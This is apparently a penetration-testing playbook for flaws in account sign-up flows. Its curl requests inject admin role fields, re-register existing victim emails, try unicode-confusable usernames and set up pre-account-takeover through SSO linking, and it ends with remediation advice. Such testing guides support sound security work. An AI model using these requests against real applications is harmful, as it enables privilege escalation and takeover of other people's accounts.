---
name: testing-registration-and-account-flaws
description: Identifying and exploiting weaknesses in account registration including duplicate/overwrite registration,
  weak password policy, missing email verification, disposable email acceptance, route-clobbering usernames,
  pre-account-takeover, and role mass-assignment.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- registration
- account-takeover
- mass-assignment
- email-verification
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing Registration and Account Flaws

## When to Use

- During authorized penetration tests of any self-service sign-up / account-creation flow
- When the application lets users choose usernames, emails, or other identifiers that may collide or clobber resources
- For validating that registration enforces verification, uniqueness, a strong password policy, and server-controlled roles
- When testing for pre-account-takeover where an attacker registers an account before the legitimate owner
- During bug bounty programs targeting broken authentication, mass assignment, and improper input validation (OWASP A04/A07:2021)

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target application
- **Burp Suite Professional**: Proxy + Repeater + Intruder for replaying and tampering sign-up requests
- **Multiple inboxes**: real, plus disposable-mail and "+alias" addresses for verification tests
- **A victim identifier**: an email/username the attacker does not control, to test pre-account-takeover
- **curl / httpie**: For manual request crafting and parameter injection
- **Knowledge of app routes**: to test username values that may collide with paths (admin, images, api)

## Critical: Checks Most Often Missed

Registration flaws quietly enable takeover and privilege escalation. For every
sign-up flow, work through this checklist:

- **Mass-assignment of role/privilege** (highest signal): add fields the form
  never shows — `"role":"admin"`, `"is_admin":true`, `"isStaff":true`,
  `"verified":true`, `"plan":"enterprise"`, `"account_type":"admin"`. If the
  backend binds the whole object, you self-provision privilege at sign-up.
- **Duplicate registration / overwrite**: register an email/username that already
  exists. If it succeeds, it may overwrite the existing account, reset its
  password, or merge — leading to takeover of the original user.
- **Pre-account-takeover (no email validation)**: register the victim's email
  with your password BEFORE they sign up. If the app does not verify email and
  later links an SSO/OAuth login to the same email, you retain access alongside
  the victim.
- **Special-username route clobbering**: register usernames like `admin`,
  `images`, `contact`, `api`, `assets`, `static`, `.well-known`. If profiles live
  at `/{username}`, your account can shadow `/images` or `/admin` and break or
  hijack app routes/content.
- **Missing/weak email verification**: complete registration and use the account
  fully without ever confirming the address; or find the verification token is
  guessable/leaked/reusable.
- **Disposable / plus-alias email acceptance**: `victim+1@`, `victim+2@`, and
  `@mailinator.com` style addresses bypass per-email limits and abuse controls.
- **Weak password policy**: accept `123456`, `password`, single char, or the
  username as the password; no length/complexity/breached-password checks.
- **Username reuse / case & unicode collisions**: `Admin`, `admin `, `аdmin`
  (Cyrillic а), trailing dots/spaces that normalize to an existing user.
- **Registration over HTTP**: the sign-up form posts credentials over cleartext.
- **Enumeration at sign-up**: "email already registered" reveals valid accounts.

## Workflow

### Step 1: Map the Registration Request and Response Model

Capture the full sign-up request, including any hidden or backend-managed fields.

```bash
# Baseline registration; capture the exact JSON the client sends
curl -s -i -X POST "https://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@yourinbox.com","username":"tester1","password":"Passw0rd!"}'

# Note the response object — it often reveals server-managed fields you can try
# to set yourself, e.g.:
#   {"id":1001,"email":"...","role":"user","verified":false,"plan":"free"}
# -> candidate mass-assignment targets: role, verified, plan
```

### Step 2: Mass-Assignment of Role and Privileged Fields

Inject privileged attributes the form never exposes.

```bash
# Add hidden privilege fields to the body and observe whether they stick
curl -s -i -X POST "https://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{
        "email":"attacker+ma@yourinbox.com",
        "username":"tester-ma",
        "password":"Passw0rd!",
        "role":"admin",
        "is_admin":true,
        "isStaff":true,
        "verified":true,
        "email_verified":true,
        "plan":"enterprise",
        "account_type":"admin",
        "permissions":["*"]
      }'

# Then read the created account / token claims to confirm the field persisted:
curl -s -H "Authorization: Bearer <token-from-register>" \
  "https://target.example.com/api/account/me" | jq '{role,is_admin,verified,plan}'

# Also try nested + alternate encodings the binder may accept:
#   "user[role]=admin"  (form-encoded nested)
#   {"profile":{"role":"admin"}}
#   role appended as a query param: /api/register?role=admin
```

### Step 3: Duplicate / Overwrite Registration and Username Collisions

Register identifiers that already exist or normalize to existing ones.

```bash
# Register the SAME email/username again and watch for overwrite/merge/reset
curl -s -i -X POST "https://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@corp.com","username":"victim","password":"Attacker123!"}'
# 200/201 (not "already exists") => possible overwrite; then try logging in
# as victim with Attacker123! to confirm takeover.

# Collision variants that may normalize to an existing account:
for u in "Victim" "victim " "victim." "victim@corp.com " "VICTIM@corp.com" "vіctim"; do
  curl -s -o /dev/null -w "$u -> %{http_code}\n" \
    -X POST "https://target.example.com/api/register" \
    -H "Content-Type: application/json" \
    --data-raw "{\"email\":\"$u\",\"username\":\"$u\",\"password\":\"Passw0rd!\"}"
done
# (note: vіctim uses a Cyrillic 'і' — unicode confusable collision)
```

### Step 4: Special-Username Route Clobbering

Register usernames that collide with application paths.

```bash
# If profiles render at https://target.example.com/{username}, registering a
# reserved word can shadow or break real routes / static assets.
for name in admin images contact api assets static css js login \
            dashboard settings about ".well-known" robots.txt; do
  curl -s -o /dev/null -w "%-14s -> %{http_code}\n" "$name" \
    -X POST "https://target.example.com/api/register" \
    -H "Content-Type: application/json" \
    --data-raw "{\"email\":\"attacker+$name@yourinbox.com\",\"username\":\"$name\",\"password\":\"Passw0rd!\"}"
done

# Then check whether the route now resolves to attacker content / breaks:
curl -s -i "https://target.example.com/images" | head -n 20
# attacker-controlled profile served at /images = route clobbering confirmed
```

### Step 5: Email Verification, Disposable Mail, and Pre-Account-Takeover

Test whether verification is enforced and whether accounts can be pre-claimed.

```bash
# --- Use the account WITHOUT verifying ---
# Register, then immediately call an authenticated endpoint:
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer <token-from-register>" \
  "https://target.example.com/api/account/sensitive-action"
# 200 before any email click = verification not enforced.

# --- Disposable / plus-alias acceptance (bypass per-email limits) ---
for e in "abuse@mailinator.com" "abuse@guerrillamail.com" \
         "victim+1@corp.com" "victim+2@corp.com"; do
  curl -s -o /dev/null -w "$e -> %{http_code}\n" \
    -X POST "https://target.example.com/api/register" \
    -H "Content-Type: application/json" \
    --data-raw "{\"email\":\"$e\",\"username\":\"u-$RANDOM\",\"password\":\"Passw0rd!\"}"
done

# --- Pre-account-takeover ---
# 1) Attacker registers the victim's email + attacker password (no verification)
curl -s -X POST "https://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@corp.com","username":"victim","password":"Attacker123!"}'
# 2) Later the victim "Sign in with Google/SSO" using victim@corp.com and the
#    app LINKS the federated identity to the pre-existing local account.
# 3) Attacker still logs in with Attacker123! => shared/persistent access.
```

### Step 6: Password Policy, Transport, and Enumeration

Probe credential strength rules, cleartext transport, and account enumeration.

```bash
# --- Weak password policy ---
for p in "1" "123456" "password" "tester1" "aaaaaa"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" \
    -X POST "https://target.example.com/api/register" \
    -H "Content-Type: application/json" \
    --data-raw "{\"email\":\"attacker+pw$RANDOM@yourinbox.com\",\"username\":\"u$RANDOM\",\"password\":\"$p\"}"
done
# Any 200/201 for trivial values = weak/missing policy (also test password==username).

# --- Registration over HTTP ---
curl -s -i -X POST "http://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"a@b.com","username":"u","password":"Passw0rd!"}' | head -n1
# Accepted over http:// = credentials submitted in cleartext.

# --- Account enumeration ---
curl -s -X POST "https://target.example.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"known@corp.com","username":"x","password":"Passw0rd!"}'
# "email already registered" vs generic success = enumeration of valid accounts.
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Mass Assignment** | Backend binds the whole request body to the model, letting attackers set role/verified/plan |
| **Duplicate / Overwrite Registration** | Re-registering an existing identifier overwrites, merges, or resets the original account |
| **Pre-Account-Takeover** | Attacker pre-registers a victim's email; later SSO linking grants shared access |
| **Route Clobbering** | A username equal to an app path (`images`, `admin`) shadows or breaks that route |
| **Email Verification** | Confirming control of the address before granting account capabilities |
| **Disposable / Plus-Alias Email** | Throwaway or `+tag` addresses that bypass per-email abuse limits |
| **Password Policy** | Length/complexity/breached-password rules preventing trivial credentials |
| **Identifier Normalization** | Case/whitespace/unicode handling that can collapse distinct inputs to one account |
| **Account Enumeration** | Sign-up responses revealing which emails/usernames already exist |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Replay and tamper sign-up requests, inject hidden fields, fuzz usernames |
| **Burp Intruder / ffuf** | Bulk-test reserved usernames, password values, and collision variants |
| **Mailinator / temp-mail / +aliases** | Generate disposable inboxes to test verification and abuse limits |
| **jwt_tool** | Inspect tokens issued at registration for injected role/verified claims |
| **curl / httpie** | Manual mass-assignment, overwrite, and transport tests |
| **OWASP ZAP** | Free proxy alternative for request tampering and fuzzing |

## Common Scenarios

### Scenario 1: Admin via Mass Assignment
The registration handler does `User.create(req.body)`. Adding `"role":"admin"` to the JSON body persists an administrative role because no field allowlist exists, granting instant privilege escalation.

### Scenario 2: Pre-Account-Takeover through SSO Linking
The app allows unverified local registration. An attacker registers `ceo@corp.com` with their own password. When the CEO later signs in with Google, the app links the federated identity to the pre-existing local account, leaving the attacker's password valid.

### Scenario 3: Route Clobbering with Reserved Username
User profiles are served at `/{username}`. Registering the username `images` causes `/images` to resolve to the attacker's profile, breaking asset loading and enabling content spoofing on a trusted path.

### Scenario 4: Overwrite Registration Resets Victim
Submitting a registration for an existing email returns success and resets the stored password hash, letting the attacker log in as the original user.

## Output Format

```
## Registration / Account Finding

**Vulnerability**: Privilege Escalation via Mass Assignment at Registration
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/register
**OWASP Category**: A04:2021 - Insecure Design / A07:2021 - Auth Failures

### Reproduction Steps
1. Send POST /api/register with the normal fields plus "role":"admin" and "verified":true
2. Receive 201 Created and an auth token for the new account
3. Call GET /api/account/me and observe role=admin, verified=true
4. Access admin-only endpoints successfully with the self-provisioned account

### Tested Weaknesses
| Test | Result |
|------|--------|
| Mass-assignment role/verified | Persisted (admin) |
| Duplicate/overwrite registration | Overwrites existing user |
| Email verification enforced | No (account usable immediately) |
| Disposable / +alias email | Accepted |
| Weak password ("123456") | Accepted |
| Reserved-username clobbering | /images shadowed |
| Registration transport | http:// accepted |
| Account enumeration | "email already registered" |

### Impact
- Any anonymous user can self-register as an administrator
- Pre-registration of victim emails enables shared access after SSO linking
- Reserved usernames break or hijack trusted application routes

### Recommendation
1. Bind only an explicit allowlist of fields; set role/verified/plan server-side
2. Reject registration for existing identifiers; normalize case/whitespace/unicode before uniqueness checks
3. Require verified email control before granting account capabilities; block disposable domains as policy dictates
4. Enforce a strong, breached-password-checked policy and require HTTPS for sign-up
5. Maintain a reserved-username denylist (admin, images, api, .well-known, etc.) and return generic responses to prevent enumeration
```
